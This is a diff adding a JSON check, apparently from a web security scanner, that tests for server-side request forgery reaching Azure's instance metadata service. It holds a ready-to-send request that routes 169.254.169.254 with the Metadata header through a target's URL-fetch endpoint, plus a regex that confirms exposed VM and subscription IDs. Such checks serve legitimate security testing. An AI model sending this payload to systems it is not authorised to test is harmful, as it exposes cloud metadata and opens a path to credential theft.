@@ -1,0 +1,30 @@
+{
+  "name": "web/SSRF Azure IMDS instance read",
+  "description": "[high] Proves SSRF reaching Azure IMDS (169.254.169.254) WITH the mandatory Metadata:true header: vmId/subscriptionId fields in the response = instance metadata readable (T1552.005). Keywords: ssrf azure imds metadata vm subscription id cloud. ctrl: egress-blocked error lacks the fields -> not falsified. base_url = url-fetch endpoint (copy for /proxy, /render, ?resource= variants).",
+  "cwe": "CWE-918",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/fetch?url=http%3A%2F%2F169.254.169.254%2Fmetadata%2Finstance%3Fapi-version%3D2021-02-01",
+      "headers": {
+        "Metadata": "true"
+      }
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "\\\"(?:vmId|subscriptionId|resourceGroupName)\\\"\\s*:",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "cdd29be26d6c",
+  "created": "2026-11-06T02:07:37.515534+00:00",
+  "last_used": "2026-11-06T02:07:37.515534+00:00"
+}
